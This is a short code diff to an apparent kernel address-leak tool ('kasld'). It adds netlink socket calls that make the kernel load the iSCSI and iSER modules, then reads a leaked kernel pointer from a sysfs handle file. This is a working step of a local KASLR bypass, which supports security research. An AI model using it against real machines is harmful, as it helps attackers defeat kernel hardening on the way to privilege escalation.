@@ -20,9 +20,11 @@
 
 #define _GNU_SOURCE
 #include <inttypes.h>
+#include <linux/netlink.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>
 #include <unistd.h>
 #include "kasld.h"
 
@@ -30,9 +32,24 @@ unsigned long get_kernel_addr_iscsi_iser_transport() {
   FILE *f;
   char *endptr;
   const char* path = "/sys/class/iscsi_transport/iser/handle";
+  int sock_fd;
   unsigned long addr = 0;
   unsigned int buff_len = 1024;
   char buff[buff_len];
+
+  // Try to load the scsi_transport_iscsi and ib_iser modules
+  sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
+  if (sock_fd >= 0)
+    close(sock_fd);
+
+  sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
+  if (sock_fd < 0) {
+    printf("[-] Failed to get a NETLINK_ISCSI socket: %m\n");
+    return 0;
+  }
+
+  close(sock_fd);
+  sleep(5);
 
   printf("[.] checking %s ...\n", path);
 
